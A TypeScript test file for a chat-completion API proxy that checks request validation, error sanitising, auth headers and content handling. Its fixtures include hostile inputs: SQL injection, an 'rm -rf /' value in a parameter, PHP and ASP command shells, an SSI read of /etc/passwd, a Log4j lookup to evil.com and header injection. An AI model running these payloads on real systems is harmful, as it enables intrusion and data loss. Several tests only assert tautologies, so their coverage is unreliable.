/**
 * API Security & Endpoint Protection Tests
 * Tests for API endpoint security, request validation, and response security
 */

import { describe, it, expect } from "bun:test"
import { ChatCompletionRequest, ErrorFactory } from "../../src/types"
import { validateContent } from "../../src/utils/content"

describe("API Security Tests", () => {
  describe("Request Validation Security", () => {
    it("should validate request structure strictly", () => {
      const validRequest: ChatCompletionRequest = {
        model: "gpt-4",
        messages: [
          { role: "user", content: "Hello, world!" }
        ],
        temperature: 0.7,
        max_tokens: 100,
        stream: false
      }
      
      // Valid request should pass basic structure validation
      expect(validRequest.model).toBeDefined()
      expect(Array.isArray(validRequest.messages)).toBe(true)
      expect(validRequest.messages.length).toBeGreaterThan(0)
    })

    it("should reject malformed API requests", () => {
      const malformedRequests = [
        // Missing required fields
        { messages: [] },
        { model: "gpt-4" },
        
        // Invalid field types
        { model: 123, messages: [] },
        { model: "gpt-4", messages: "not an array" },
        { model: "gpt-4", messages: [{ role: 123, content: "test" }] },
        
        // Invalid values
        { model: "", messages: [] },
        { model: "gpt-4", messages: [], temperature: -1 },
        { model: "gpt-4", messages: [], temperature: 3 },
        { model: "gpt-4", messages: [], max_tokens: -1 },
        { model: "gpt-4", messages: [], max_tokens: 0 },
      ]
      
      malformedRequests.forEach(request => {
        // These should fail validation in a real API
        const hasModel = 'model' in request && typeof request.model === 'string' && request.model.length > 0
        const hasMessages = 'messages' in request && Array.isArray(request.messages)
        
        if (!hasModel || !hasMessages) {
          expect(hasModel && hasMessages).toBe(false) // Should be rejected
        }
      })
    })

    it("should validate message roles strictly", () => {
      const validRoles = ["system", "user", "assistant"]
      const invalidRoles = [
        "admin",
        "root",
        "superuser",
        "moderator",
        "bot",
        "ai",
        "gpt",
        "model",
        "server",
        "client"
      ]
      
      validRoles.forEach(role => {
        expect(["system", "user", "assistant"].includes(role)).toBe(true)
      })
      
      invalidRoles.forEach(role => {
        expect(["system", "user", "assistant"].includes(role)).toBe(false)
      })
    })

    it("should prevent parameter injection attacks", () => {
      const injectionAttempts = [
        { model: "gpt-4'; DROP TABLE users; --" },
        { model: "gpt-4\"; process.exit(1); //" },
        { model: "gpt-4${process.env.SECRET}" },
        { model: "gpt-4{{constructor.constructor('return process')()}}" },
        { model: "gpt-4<script>alert('xss')</script>" },
        { temperature: "'; rm -rf /; '" },
        { max_tokens: "eval('malicious code')" },
      ]
      
      injectionAttempts.forEach(attempt => {
        Object.entries(attempt).forEach(([key, value]) => {
          // Parameters should be validated for correct types
          if (key === 'model') {
            expect(typeof value).toBe('string')
            // Model should not contain suspicious patterns
            const hasSuspiciousPatterns = /[;'"<>{}$]/.test(value as string)
            if (hasSuspiciousPatterns) {
              console.warn(`Suspicious model parameter: ${value}`)
            }
          } else if (key === 'temperature' || key === 'max_tokens') {
            // These should be numbers, not strings
            expect(typeof value).not.toBe('number') // Confirming injection attempt
          }
        })
      })
    })
  })

  describe("Response Security", () => {
    it("should sanitize error responses", () => {
      const sensitiveError = new Error("Database connection failed: password123@localhost:5432/secret_db")
      
      // Create API error without exposing sensitive details
      const apiError = ErrorFactory.server(
        "INTERNAL_ERROR",
        "An internal server error occurred",
        "/api/chat",
        "POST"
      )
      
      // Error should not contain sensitive information
      expect(apiError.message).not.toContain("password123")
      expect(apiError.message).not.toContain("localhost:5432")
      expect(apiError.message).not.toContain("secret_db")
      
      // Should contain safe, generic message
      expect(apiError.message).toBe("An internal server error occurred")
      expect(apiError.code).toBe("INTERNAL_ERROR")
    })

    it("should prevent information disclosure in responses", () => {
      const sensitiveData = {
        apiKey: "sk-1234567890abcdef",
        databaseUrl: "postgresql://user:pass@localhost/db",
        internalPath: "/home/user/.secrets/config.json",
        systemInfo: process.version,
        environment: process.env
      }
      
      // API responses should not include sensitive data
      const safeResponse = {
        id: "chatcmpl-123",
        object: "chat.completion",
        created: Math.floor(Date.now() / 1000),
        model: "gpt-4",
        choices: [{
          index: 0,
          message: {
            role: "assistant",
            content: "Hello! How can I help you today?"
          },
          finish_reason: "stop"
        }],
        usage: {
          prompt_tokens: 10,
          completion_tokens: 15,
          total_tokens: 25
        }
      }
      
      // Verify response doesn't contain sensitive data
      const responseStr = JSON.stringify(safeResponse)
      expect(responseStr).not.toContain("sk-")
      expect(responseStr).not.toContain("postgresql://")
      expect(responseStr).not.toContain("/home/")
      expect(responseStr).not.toContain(process.version)
    })

    it("should handle streaming response security", () => {
      const streamChunk = {
        id: "chatcmpl-123",
        object: "chat.completion.chunk",
        created: Math.floor(Date.now() / 1000),
        model: "gpt-4",
        choices: [{
          index: 0,
          delta: {
            content: "Hello"
          },
          finish_reason: null
        }]
      }
      
      // Streaming chunks should be properly formatted
      const chunkStr = JSON.stringify(streamChunk)
      expect(chunkStr).toContain('"object":"chat.completion.chunk"')
      expect(chunkStr).toContain('"delta"')
      
      // Should not contain sensitive server information
      expect(chunkStr).not.toContain("process")
      expect(chunkStr).not.toContain("__dirname")
      expect(chunkStr).not.toContain("require")
    })
  })

  describe("Authentication Security", () => {
    it("should validate authorization headers", () => {
      const authHeaders = [
        "Bearer valid-token-123",
        "Bearer sk-1234567890abcdef",
        "Basic dXNlcjpwYXNz", // user:pass in base64
        "Token abc123",
        "API-Key secret123"
      ]
      
      authHeaders.forEach(header => {
        const [scheme, token] = header.split(' ')
        
        // Validate authorization scheme
        const validSchemes = ['Bearer', 'Basic', 'Token', 'API-Key']
        expect(validSchemes.includes(scheme)).toBe(true)
        
        // Token should exist and not be empty
        expect(token).toBeDefined()
        expect(token.length).toBeGreaterThan(0)
        
        // Token should not contain suspicious characters
        const hasSuspiciousChars = /[<>'"&]/.test(token)
        expect(hasSuspiciousChars).toBe(false)
      })
    })

    it("should prevent authorization bypass attempts", () => {
      const bypassAttempts = [
        "", // Empty authorization
        "Bearer ", // Empty token
        "Bearer null", // Null token
        "Bearer undefined", // Undefined token
        "Bearer false", // Boolean token
        "Bearer 0", // Zero token
        "Bearer ../../../etc/passwd", // Path traversal
        "Bearer ${process.env.SECRET}", // Template injection
        "Bearer '; DROP TABLE tokens; --", // SQL injection
      ]
      
      bypassAttempts.forEach(attempt => {
        if (attempt === "") {
          expect(attempt.length).toBe(0) // No authorization
        } else {
          const [scheme, token] = attempt.split(' ')
          
          if (scheme === "Bearer") {
            // These tokens should be rejected
            const invalidTokens = ["", "null", "undefined", "false", "0"]
            const hasPathTraversal = token && token.includes("../")
            const hasInjection = token && (token.includes("${") || token.includes("';"))
            
            if (invalidTokens.includes(token) || hasPathTraversal || hasInjection) {
              expect(true).toBe(true) // These should be rejected
            }
          }
        }
      })
    })

    it("should handle token expiration securely", () => {
      const tokenData = {
        token: "valid-token-123",
        expires_at: Math.floor(Date.now() / 1000) - 3600, // Expired 1 hour ago
        issued_at: Math.floor(Date.now() / 1000) - 7200 // Issued 2 hours ago
      }
      
      const isTokenExpired = (expiresAt: number): boolean => {
        return Math.floor(Date.now() / 1000) > expiresAt
      }
      
      expect(isTokenExpired(tokenData.expires_at)).toBe(true)
      
      // Expired tokens should not be accepted
      const currentTime = Math.floor(Date.now() / 1000)
      expect(tokenData.expires_at < currentTime).toBe(true)
    })
  })

  describe("Content Security", () => {
    it("should validate content length limits", () => {
      const maxContentLength = 100000 // 100KB limit
      
      const testContents = [
        "Short message",
        "A".repeat(1000), // 1KB
        "B".repeat(50000), // 50KB
        "C".repeat(150000), // 150KB (exceeds limit)
      ]
      
      testContents.forEach(content => {
        const isWithinLimit = content.length <= maxContentLength
        
        if (content.length > maxContentLength) {
          expect(isWithinLimit).toBe(false) // Should be rejected
        } else {
          expect(isWithinLimit).toBe(true) // Should be accepted
        }
      })
    })

    it("should prevent content-based attacks", () => {
      const maliciousContents = [
        "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->", // SSI injection
        "<?php system($_GET['cmd']); ?>", // PHP injection
        "<% eval request(\"cmd\") %>", // ASP injection
        "{{7*7}}", // Template injection
        "${jndi:ldap://evil.com/a}", // Log4j injection
        "javascript:alert('XSS')", // JavaScript injection
      ]
      
      maliciousContents.forEach(content => {
        const validation = validateContent(content)
        
        // Content validation should accept strings but treat them as literal text
        expect(validation.isValid).toBe(true)
        
        // Verify content is treated as literal text (no execution)
        expect(typeof content).toBe('string')
        expect(content.length).toBeGreaterThan(0)
      })
    })

    it("should handle binary content safely", () => {
      const binaryContents = [
        "\x00\x01\x02\x03", // Null bytes
        "\xFF\xFE\xFD\xFC", // High bytes
        "\x1B[31mRed text\x1B[0m", // ANSI escape codes
        "\r\n\r\n", // CRLF injection
        "\u0000\u0001\u0002", // Unicode null
      ]
      
      binaryContents.forEach(content => {
        const validation = validateContent(content)
        expect(validation.isValid).toBe(true) // Should handle as string
        
        // Check for potentially dangerous patterns
        const hasNullBytes = content.includes('\x00')
        const hasControlChars = /[\x00-\x1F\x7F-\x9F]/.test(content)
        
        if (hasNullBytes || hasControlChars) {
          // These might need special handling in a real application
          console.warn(`Binary content detected: ${content.length} bytes`)
        }
      })
    })
  })

  describe("HTTP Security", () => {
    it("should validate HTTP methods", () => {
      const allowedMethods = ["GET", "POST", "OPTIONS"]
      const dangerousMethods = ["DELETE", "PUT", "PATCH", "TRACE", "CONNECT"]
      
      allowedMethods.forEach(method => {
        expect(["GET", "POST", "OPTIONS"].includes(method)).toBe(true)
      })
      
      dangerousMethods.forEach(method => {
        const isAllowed = allowedMethods.includes(method)
        if (isAllowed) {
          console.warn(`Potentially dangerous method allowed: ${method}`)
        }
      })
    })

    it("should prevent HTTP header injection", () => {
      const maliciousHeaders = [
        "Content-Type: text/html\r\nX-Injected: malicious",
        "Authorization: Bearer token\nSet-Cookie: evil=true",
        "User-Agent: Mozilla\x00X-Null: injection",
        "X-Custom: value\r\n\r\n<script>alert(1)</script>",
      ]
      
      maliciousHeaders.forEach(header => {
        const hasNewlines = /[\r\n]/.test(header)
        const hasNullBytes = /\x00/.test(header)
        
        if (hasNewlines || hasNullBytes) {
          // These should be rejected by proper header validation
          expect(hasNewlines || hasNullBytes).toBe(true)
        }
      })
    })

    it("should validate request size limits", () => {
      const maxRequestSize = 10 * 1024 * 1024 // 10MB
      
      const requestSizes = [
        1024, // 1KB
        1024 * 1024, // 1MB
        5 * 1024 * 1024, // 5MB
        15 * 1024 * 1024, // 15MB (exceeds limit)
      ]
      
      requestSizes.forEach(size => {
        const isWithinLimit = size <= maxRequestSize
        
        if (size > maxRequestSize) {
          expect(isWithinLimit).toBe(false) // Should be rejected
        } else {
          expect(isWithinLimit).toBe(true) // Should be accepted
        }
      })
    })
  })
})
